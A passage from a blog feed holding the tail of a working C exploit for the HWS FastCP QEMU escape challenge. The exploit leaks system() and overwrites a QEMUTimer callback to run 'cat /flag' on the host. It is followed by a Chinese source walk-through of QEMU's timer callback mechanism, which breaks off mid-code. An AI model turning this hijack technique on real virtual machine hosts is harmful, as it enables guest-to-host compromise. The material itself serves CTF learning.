mmio_write(<span class="number">0x18</span>,<span class="number">4</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy_to_CP_buffer</span><span class="params">(<span class="type">void</span>* src,<span class="type">uint64_t</span> cnt)</span></span><br><span class="line">{</span><br><span class="line">    CP_INFO cp_info;</span><br><span class="line">    cp_info.CP_cnt = cnt;</span><br><span class="line">    cp_info.CP_src = gva_to_gpa(src);</span><br><span class="line">    mmio_write(<span class="number">8</span>,gva_to_gpa(&amp;cp_info));</span><br><span class="line">    mmio_write(<span class="number">0x10</span>,<span class="number">1</span>);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>,<span class="number">2</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy_to_CP_buffer_plus</span><span class="params">(<span class="type">void</span>* src,<span class="type">void</span>* dst,<span class="type">uint64_t</span> cnt)</span></span><br><span class="line">{</span><br><span class="line">    CP_INFO cp_info[<span class="number">0x11</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">0x11</span>;++i)</span><br><span class="line">    {</span><br><span class="line">        cp_info[i].CP_dst = gva_to_gpa(dst);</span><br><span class="line">        cp_info[i].CP_cnt = cnt;</span><br><span class="line">        cp_info[i].CP_src = gva_to_gpa(src);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">8</span>,gva_to_gpa(&amp;cp_info));</span><br><span class="line">    mmio_write(<span class="number">0x10</span>,<span class="number">0x11</span>);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>,<span class="number">1</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    init_pa();</span><br><span class="line">    init_mmio();</span><br><span class="line">    system(<span class="string">"sysctl vm.nr_hugepages=1"</span>);</span><br><span class="line">    <span class="type">char</span>* buf = mmap(<span class="literal">NULL</span>,<span class="number">2048</span>*<span class="number">1024</span>,PROT_READ|PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS|MAP_HUGETLB,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(buf==<span class="number">-1</span>){</span><br><span class="line">        Err(<span class="string">"mmap buf"</span>);</span><br><span class="line">    }</span><br><span class="line">    HEX(buf);</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'a'</span>,<span class="number">2048</span>*<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    copy_from_CP_buffer(buf,<span class="number">0x1000</span>+<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> system_addr = *(<span class="type">uint64_t</span>*)&amp;buf[<span class="number">0x1010</span>] - <span class="number">0x21AD00</span>;</span><br><span class="line">    HEX(system_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> FastCPState_addr = *(<span class="type">uint64_t</span>*)&amp;buf[<span class="number">0x1018</span>];</span><br><span class="line">    HEX(FastCPState_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> cmd_addr = FastCPState_addr+<span class="number">0xA00</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf,<span class="string">"cat /flag\x00"</span>);</span><br><span class="line">    *(<span class="type">uint64_t</span>*)&amp;buf[<span class="number">0x1010</span>] = system_addr;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)&amp;buf[<span class="number">0x1018</span>] = cmd_addr;</span><br><span class="line">    copy_to_CP_buffer(buf,<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    copy_to_CP_buffer_plus(buf,buf,<span class="number">0x1000</span>+<span class="number">0x20</span>);</span><br><span class="line">    </span><br><span class="line">    LOG(<span class="string">"Trigger:"</span>);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>,<span class="number">2</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> Qemu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Qemu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QemuTimer Callback机制</title>
      <link href="/2023/QemuTimer-Callback/"/>
      <url>/2023/QemuTimer-Callback/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在做2021 HWS FastCP的时候,有这样一个场景.漏洞点是对CP_buffer的溢出读写,可以覆盖掉之后的QEMUTimer结构,自然想到劫持其的callback函数指针.</p><p>但又多想了一点,cp_timer的回调函数是在pci_FastCP_realize中调用timer_init_full注册(初始化)过的,说不定callback指针已经在另一个位置保存并作为之后回调使用,并不会调用该结构中的指针.</p><span id="more"></span><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FastCPState</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  PCIDevice_0 pdev;</span><br><span class="line">  MemoryRegion_0 mmio;</span><br><span class="line">  CP_state cp_state;</span><br><span class="line">  <span class="type">uint8_t</span> handling;</span><br><span class="line">  <span class="type">uint32_t</span> irq_status;</span><br><span class="line">  <span class="type">char</span> CP_buffer[<span class="number">4096</span>];</span><br><span class="line">  QEMUTimer_0 cp_timer;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="type">int64_t</span> expire_time;</span><br><span class="line">  QEMUTimerList_0 *timer_list;</span><br><span class="line">  QEMUTimerCB *cb;</span><br><span class="line">  <span class="type">void</span> *opaque;</span><br><span class="line">  QEMUTimer_0 *next;</span><br><span class="line">  <span class="type">int</span> attributes;</span><br><span class="line">  <span class="type">int</span> scale;</span><br><span class="line">};</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>虽然只需打个断点动调一下就能验证,但当我看到timer_init_full的实现,一脸震惊.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">timer_init_full</span><span class="params">(QEMUTimer *ts,</span></span><br><span class="line"><span class="params">                     QEMUTimerListGroup *timer_list_group, QEMUClockType type,</span></span><br><span class="line"><span class="params">                     <span class="type">int</span> scale, <span class="type">int</span> attributes,</span></span><br><span class="line"><span class="params">                     QEMUTimerCB *cb, <span class="type">void</span> *opaque)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (!timer_list_group) {</span><br><span class="line">        timer_list_group = &amp;main_loop_tlg;</span><br><span class="line">    }</span><br><span class="line">    ts-&gt;timer_list = timer_list_group-&gt;tl[type];</span><br><span class="line">    ts-&gt;cb = cb;</span><br><span class="line">    ts-&gt;opaque = opaque;</span><br><span class="line">    ts-&gt;scale = scale;</span><br><span class="line">    ts-&gt;attributes = attributes;</span><br><span class="line">    ts-&gt;expire_time = <span class="number">-1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>想象中的注册函数肯定要将ts链入timer_list链表中,但这里却仅是将ts-&gt;timer_list指向了对应的timer_list.形成了下图的结构,那当时间到达,如何找到ts?在内存中搜索timer_list指针?肯定不可能.于是便开始看Qemu源码.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311282258582.png"></p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>最后发现没有那么玄乎,加入链表的操作是在timer_mod中完成的.从某个点切入来看源码就是会有无数个莫名其妙: “这里为什么要调这个?这个条件是什么意思?”,为了解决一连串的问题,完整的跟了一遍QemuTimer Callback机制的源码.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*util/qemu-timer.c*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">timer_mod</span><span class="params">(QEMUTimer *ts, <span class="type">int64_t</span> expire_time)</span></span><br><span class="line">{</span><br><span class="line">    timer_mod_ns(ts, expire_time * ts-&gt;scale);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* modify the current timer so that it will be fired when current_time</span></span><br><span class="line"><span class="comment">   &gt;= expire_time. The corresponding callback will be called. */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">timer_mod_ns</span><span class="params">(QEMUTimer *ts, <span class="type">int64_t</span> expire_time)</span></span><br><span class="line">{</span><br><span class="line">    QEMUTimerList *timer_list = ts-&gt;timer_list;</span><br><span class="line">    <span class="type">bool</span> rearm;</span><br><span class="line"></span><br><span class="line">    qemu_mutex_lock(&amp;timer_list-&gt;active_timers_lock);</span><br><span class="line">    <span class="comment">//将ts从timer_list中移除(?什么时候加进来过,估计是防止二次加入)</span></span><br><span class="line">    timer_del_locked(timer_list, ts);</span><br><span class="line">    <span class="comment">/*将ts根据expire_time插入到active_timer链表中,</span></span><br><span class="line"><span class="comment">    active_timer是一个sorted list.</span></span><br><span class="line"><span class="comment">    可以看出其是按照expire_time升序排列的.</span></span><br><span class="line"><span class="comment">    返回值rearm代表插入后ts是否在头部,</span></span><br><span class="line"><span class="comment">    即timer_list中最近的deadline改变.*/</span></span><br><span class="line">    rearm = timer_mod_ns_locked(timer_list, ts, expire_time);</span><br><span class="line">    qemu_mutex_unlock(&amp;timer_list-&gt;active_timers_lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*若timer_list中最近的deadline改变,调用</span></span><br><span class="line"><span class="comment">    timerlist_rearm.原因后续解释*/</span></span><br><span class="line">    <span class="keyword">if</span> (rearm) {</span><br><span class="line">        timerlist_rearm(timer_list);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">timer_del_locked</span><span class="params">(QEMUTimerList *timer_list, QEMUTimer *ts)</span></span><br><span class="line">{</span><br><span class="line">    QEMUTimer **pt, *t;</span><br><span class="line"></span><br><span class="line">    ts-&gt;expire_time = <span class="number">-1</span>;</span><br><span class="line">    pt = &amp;timer_list-&gt;active_timers;</span><br><span class="line">    <span class="keyword">for</span>(;;) {</span><br><span class="line">        t = *pt;</span><br><span class="line">        <span class="keyword">if</span> (!t)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (t == ts) {</span><br><span class="line">            qatomic_set(pt, t-&gt;next);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        pt = &amp;t-&gt;next;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">timer_mod_ns_locked</span><span class="params">(QEMUTimerList *timer_list,</span></span><br><span class="line"><span class="params">                                QEMUTimer *ts, <span class="type">int64_t</span> expire_time)</span></span><br><span class="line">{</span><br><span class="line">    QEMUTimer **pt, *t;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* add the timer in the sorted list */</span></span><br><span class="line">    pt = &amp;timer_list-&gt;active_timers;</span><br><span class="line">    <span class="keyword">for</span> (;;) {</span><br><span class="line">        t = *pt;</span><br><span class="line">        <span class="keyword">if</span> (!timer_expired_ns(t, expire_time)) {</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        pt = &amp;t-&gt;next;</span><br><span class="line">    }</span><br><span class="line">    ts-&gt;expire_time = MAX(expire_time, <span class="number">0</span>);</span><br><span class="line">    ts-&gt;next = *pt;</span><br><span class="line">    qatomic_set(pt, ts);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pt == &amp;timer_list-&gt;active_timers;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">timerlist_rearm</span><span class="params">(QEMUTimerList *timer_list)</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">/* Interrupt execution to force deadline recalculation.  */</span></span><br><span class="line">    <span class="keyword">if</span> (icount_enabled() &amp;&amp; timer_list-&gt;clock-&gt;type == QEMU_CLOCK_VIRTUAL) {</span><br><span class="line">        icount_start_warp_timer();</span><br><span class="line">    }</span><br><span class="line">    timerlist_notify(timer_list);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>timerlist_rearm最终会调用qemu_notify_event函数,</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*softmmu/cpu-timers.c*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qemu_timer_notify_cb</span><span class="params">(<span class="type">void</span> *opaque, QEMUClockType type)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (!icount_enabled() || type != QEMU_CLOCK_VIRTUAL) {</span><br><span class="line">        qemu_notify_event();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (qemu_in_vcpu_thread()) {</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * A CPU is currently running; kick it back out to the</span></span><br><span class="line"><span class="comment">         * tcg_cpu_exec() loop so it will recalculate its</span></span><br><span class="line"><span class="comment">         * icount deadline immediately.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        qemu_cpu_kick(current_cpu);</span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span> (first_cpu) {</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * qemu_cpu_kick is not enough to kick a halted CPU out of</span></span><br><span class="line"><span class="comment">         * qemu_tcg_wait_io_event.  async_run_on_cpu, instead,</span></span><br><span class="line"><span class="comment">         * causes cpu_thread_is_idle to return false.  This way,</span></span><br><span class="line"><span class="comment">         * handle_icount_deadline can run.</span></span><br><span class="line"><span class="comment">         * If we have no CPUs at all for some reason, we don't</span></span><br><span class="line"><span class="comment">         * need to do anything.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        async_run_on_cpu(first_cpu, do_nothing, RUN_ON_CPU_NULL);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>从qemu_notify_event注释中看出,其会迫使 main_loop_wait检查挂起的事件并退出,使得触发一次qemu_clock_run_all_timers.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * qemu_notify_event: Force processing of pending events.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Similar to signaling a condition variable, qemu_notify_event forces</span></span><br><span class="line"><span class="comment"> * main_loop_wait to look at pending events and exit.  The caller of</span></span><br><span class="line"><span class="comment"> * main_loop_wait will usually call it again very soon, so qemu_notify_event</span></span><br><span class="line"><span class="comment"> * also has the side effect of recalculating the sets of file descriptors</span></span><br><span class="line"><span class="comment"> * that the main loop waits for.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Calling qemu_notify_event is rarely necessary, because main loop</span></span><br><span class="line"><span class="comment"> * services (bottom halves and timers) call it themselves.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></tbody></table></figure><p>最终处理的调用链</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">main_loop_wait-&gt;</span><br><span class="line">    timerlistgroup_deadline_ns -&gt;</span><br><span class="line">        qemu_soonest_timeout</span><br><span class="line">    os_host_main_loop_wait-&gt;</span><br><span class="line">        qemu_poll_ns-&gt;</span><br><span class="line">            ppoll </span><br><span class="line">    qemu_clock_run_all_timers-&gt;</span><br><span class="line">        timerlist_run_timers-&gt;</span><br><span class="line">            cb</span><br></pre></td></tr></tbody></table></figure><p>先来分析一下main_loop_wait函数,该函数被主例程循环调用,使用poll(ppoll)监听描述符事件并将结果Dispatch到对应的notifier进行处理.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*util/main-loop.c*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main_loop_wait</span><span class="params">(<span class="type">int</span> nonblocking)</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">//设置poll参数,timeout = UINT32_MAX即无限阻塞等待</span></span><br><span class="line">    MainLoopPoll mlpoll = {</span><br><span class="line">        .state = MAIN_LOOP_POLL_FILL,</span><br><span class="line">        .timeout = UINT32_MAX,</span><br><span class="line">        .pollfds = gpollfds,</span><br><span class="line">    };</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="type">int64_t</span> timeout_ns;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nonblocking) {</span><br><span class="line">        mlpoll.timeout = <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* poll any events */</span></span><br><span class="line">    g_array_set_size(gpollfds, <span class="number">0</span>); <span class="comment">/* reset for new iteration */</span></span><br><span class="line">    <span class="comment">/* <span class="doctag">XXX:</span> separate device handlers from system ones */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//调用main_loop_poll_notifiers中所有notifier的notify函数</span></span><br><span class="line">    notifier_list_notify(&amp;main_loop_poll_notifiers, &amp;mlpoll);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mlpoll.timeout == UINT32_MAX) {</span><br><span class="line">    <span class="comment">//这里其实是一个32位的-1到64位-1的转换</span></span><br><span class="line">        timeout_ns = <span class="number">-1</span>;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        timeout_ns = (<span class="type">uint64_t</span>)mlpoll.timeout * (<span class="type">int64_t</span>)(SCALE_MS);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*计算timerlistgroup中最近的deadline,</span></span><br><span class="line"><span class="comment">    若小于当前timeout_ns,更新timeout_ns为deadline.*/</span></span><br><span class="line">    timeout_ns = qemu_soonest_timeout(timeout_ns,</span><br><span class="line">                                      timerlistgroup_deadline_ns(</span><br><span class="line">                                          &amp;main_loop_tlg));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//以timeout=timeout_ns进行poll(ppoll)阻塞</span></span><br><span class="line">    ret = os_host_main_loop_wait(timeout_ns);</span><br><span class="line"></span><br><span class="line">    mlpoll.state = ret &lt; <span class="number">0</span> ? MAIN_LOOP_POLL_ERR : MAIN_LOOP_POLL_OK;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*再次调用main_loop_poll_notifiers中所有</span></span><br><span class="line"><span class="comment">    notifier的notify函数告知其检查这次poll的结果.*/</span></span><br><span class="line">    notifier_list_notify(&amp;main_loop_poll_notifiers, &amp;mlpoll);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (icount_enabled()) {</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * CPU thread can infinitely wait for event after</span></span><br><span class="line"><span class="comment">         * missing the warp</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        icount_start_warp_timer();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//可能有timer超时了,进行回调.</span></span><br><span class="line">    qemu_clock_run_all_timers();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>main_loop_wait每次计算main_loop_tlg中最近的deadline并进行阻塞,每次结束阻塞尝试qemu_clock_run_all_timers进行回调(若阻塞结束是因为超时,则应该进行timer回调,若是因为某个事件,仍然调用了qemu_clock_run_all_timers但并不会起作用.</p><p>不过有个特殊情况,os_host_main_loop_wait时最大阻塞时间使用的是进入阻塞之前计算出的deadline,当阻塞时间结束,意味着到达deadline,正好进行timer的callback.但如果在阻塞期间deadline提前了,继续阻塞等待之前的deadline可能导致新的deadline到达而未进行回调,产生错误.</p><p>这就是为什么在timer_mod_ns函数中,当deadline提前时需要调用timerlist_rearm(最终是qemu_notify_event)的原因:使os_host_main_loop_wait立刻返回并重新设置deadline.</p><p>当然也解释了这个对qemu_clock_run_all_timers看似无意义的调用.</p><blockquote><p>若阻塞结束是因为超时,则应该进行timer回调,若是因为某个事件,仍然调用了qemu_clock_run_all_timers但并不会起作用.</p></blockquote><p>最终确认QemuTimer上的callback函数会被调用.且参数可控.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*util/qemu-timer.c*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">timerlist_run_timers</span><span class="params">(QEMUTimerList *timer_list)</span></span><br><span class="line">{</span><br><span class="line">    QEMUTimer *ts;</span><br><span class="line">    <span class="type">int64_t</span> current_time;</span><br><span class="line">    <span class="type">bool</span> progress = <span class="literal">false</span>;</span><br><span class="line">    QEMUTimerCB *cb;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!qatomic_read(&amp;timer_list-&gt;active_timers)) {</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    qemu_event_reset(&amp;timer_list-&gt;timers_done_ev);</span><br><span class="line">    <span class="keyword">if</span> (!timer_list-&gt;clock-&gt;enabled) {</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (timer_list-&gt;clock-&gt;type) {</span><br><span class="line">    <span class="keyword">case</span> QEMU_CLOCK_REALTIME:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">case</span> QEMU_CLOCK_VIRTUAL:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> QEMU_CLOCK_HOST:</span><br><span class="line">        <span class="keyword">if</span> (!replay_checkpoint(CHECKPOINT_CLOCK_HOST)) {</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> QEMU_CLOCK_VIRTUAL_RT:</span><br><span class="line">        <span class="keyword">if</span> (!replay_checkpoint(CHECKPOINT_CLOCK_VIRTUAL_RT)) {</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span 